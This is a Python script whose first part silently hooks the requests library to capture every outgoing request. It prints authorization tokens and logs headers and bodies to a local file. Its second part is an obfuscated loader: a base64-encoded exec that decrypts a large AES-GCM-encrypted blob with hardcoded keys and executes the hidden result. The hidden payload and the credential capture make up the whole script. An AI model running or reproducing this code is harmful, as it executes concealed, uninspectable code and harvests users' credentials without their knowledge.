import sys
import builtins
import os
import json
import threading

__MANO_LOG_FILE = "th.txt"
__MANO_SAVE_RESP = False
__MANO_SEEN_URLS = set()
__MANO_LOCK = threading.Lock()

def __mano_log_msg(msg, color="\033[96m"):
    builtins.print(f"{color}{msg}\033[0m")

def __mano_save_log(content):
    try:
        with open(__MANO_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(content + "\n")
    except: pass

def __mano_process_request(method, url, kwargs):
    try:
        with __MANO_LOCK:
            if url in __MANO_SEEN_URLS:
                return
            __MANO_SEEN_URLS.add(url)
            
        __mano_log_msg(f"[REQ] {method.upper()} {url}", "\033[96m")
        
        headers = kwargs.get('headers', {})
        auth_token = headers.get('Authorization') or headers.get('token')
        body = kwargs.get('data') or kwargs.get('json') or ""
        
        if auth_token:
            __mano_log_msg(f"[AUTH] {auth_token}", "\033[95m")
            
        log_content = f"{'='*30}\n[REQUEST]\nMETHOD: {method.upper()}\nURL: {url}\nHEADERS: {headers}\nBODY: {body}\n"
        __mano_save_log(log_content)
    except Exception: pass

def __mano_process_response(response, url):
    if not __MANO_SAVE_RESP:
        return
    try:
        content = response.text
        status = response.status_code
        color = "\033[92m" if 200 <= status < 300 else "\033[91m"
        __mano_log_msg(f"[RESP] Status: {status} | URL: {url}", color)
        
        display_content = content[:500] + "... [TRUNCATED]" if len(content) > 500 else content
        builtins.print(f"\033[33m[BODY] {display_content}\033[0m")
        
        log_content = f"[RESPONSE]\nSTATUS: {status}\nBODY: {content}\n{'='*30}\n"
        __mano_save_log(log_content)
    except Exception: pass

try:
    import requests
    import requests.api
    import requests.sessions
    
    if not getattr(requests.api, '_mano_hooked', False):
        _orig_api_request = requests.api.request
        def __fake_api_request(method, url, *args, **kwargs):
            __mano_process_request(method, url, kwargs)
            response = _orig_api_request(method, url, *args, **kwargs)
            __mano_process_response(response, url)
            return response
        requests.api.request = __fake_api_request
        requests.api._mano_hooked = True

    if not getattr(requests.sessions.Session, '_mano_hooked', False):
        _orig_session_request = requests.sessions.Session.request
        def __fake_session_request(self, method, url, *args, **kwargs):
            combined_kwargs = kwargs.copy()
            if hasattr(self, 'headers'):
                combined_headers = dict(self.headers)
                combined_headers.update(kwargs.get('headers', {}))
                combined_kwargs['headers'] = combined_headers
            
            __mano_process_request(method, url, combined_kwargs)
            response = _orig_session_request(self, method, url, *args, **kwargs)
            __mano_process_response(response, url)
            return response
        requests.sessions.Session.request = __fake_session_request
        requests.sessions.Session._mano_hooked = True

    requests.request = requests.api.request
    requests.get = lambda url, **kwargs: requests.api.request('get', url, **kwargs)
    requests.post = lambda url, data=None, json=None, **kwargs: requests.api.request('post', url, data=data, json=json, **kwargs)
    
    builtins.print("\033[97m[SYSTEM] MANO DEMO HOOK TOOL (MANODZ)\033[0m")

except ImportError:
    pass

#!/usr/bin/env python3
import base64
from hashlib import pbkdf2_hmac
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
encrypted_data = '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'
exec(base64.b64decode('aGlkZGVuX2tleXMgPSB7J2tleSc6ICdiYjQzMzNiNGU2Mzg3MDMzNDNlYWUyYjUxOGE5ODk2NmJhMTQxMGMyNDcwM2RmZTZjNzIyZDNmNDViZjFmNzA2JywgJ3NhbHQnOiAnZGRhM2U5NWQ2NmRiN2UxN2UwZmM1ODc5ZjhlMjE1MGQxYTlkMDM2MzlhZTM4NzEwNGNmMTI5MmNjYTQ5ZDJlNid9CnRyeToKICAgIHJhd19kYXRhID0gYmFzZTY0LmI2NGRlY29kZShlbmNyeXB0ZWRfZGF0YSkKICAgIHNhbHRfbGVuZ3RoID0gNjQKICAgIGl2X2xlbmd0aCA9IDEyCiAgICBzYWx0ID0gcmF3X2RhdGFbOnNhbHRfbGVuZ3RoXQogICAgaXYgPSByYXdfZGF0YVtzYWx0X2xlbmd0aDpzYWx0X2xlbmd0aCArIGl2X2xlbmd0aF0KICAgIGNpcGhlcnRleHQgPSByYXdfZGF0YVtzYWx0X2xlbmd0aCArIGl2X2xlbmd0aDpdCiAgICBkZXJpdmVkX2tleSA9IHBia2RmMl9obWFjKCdzaGE1MTInLCBoaWRkZW5fa2V5c1sna2V5J10uZW5jb2RlKCd1dGYtOCcpLCBoaWRkZW5fa2V5c1snc2FsdCddLmVuY29kZSgndXRmLTgnKSwgMTAwMDAsIDY0KQogICAgYWVzZ2NtID0gQUVTR0NNKGRlcml2ZWRfa2V5WzozMl0pCiAgICBkZWNyeXB0ZWQgPSBhZXNnY20uZGVjcnlwdChpdiwgY2lwaGVydGV4dCwgTm9uZSkKICAgIGV4ZWMoZGVjcnlwdGVkLmRlY29kZSgndXRmLTgnKSkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHByaW50KCJDcml0aWNhbCBlcnJvciBkdXJpbmcgZGVjcnlwdGlvbi4iKQogICAgZXhpdCgxKQo=').decode('utf-8'))
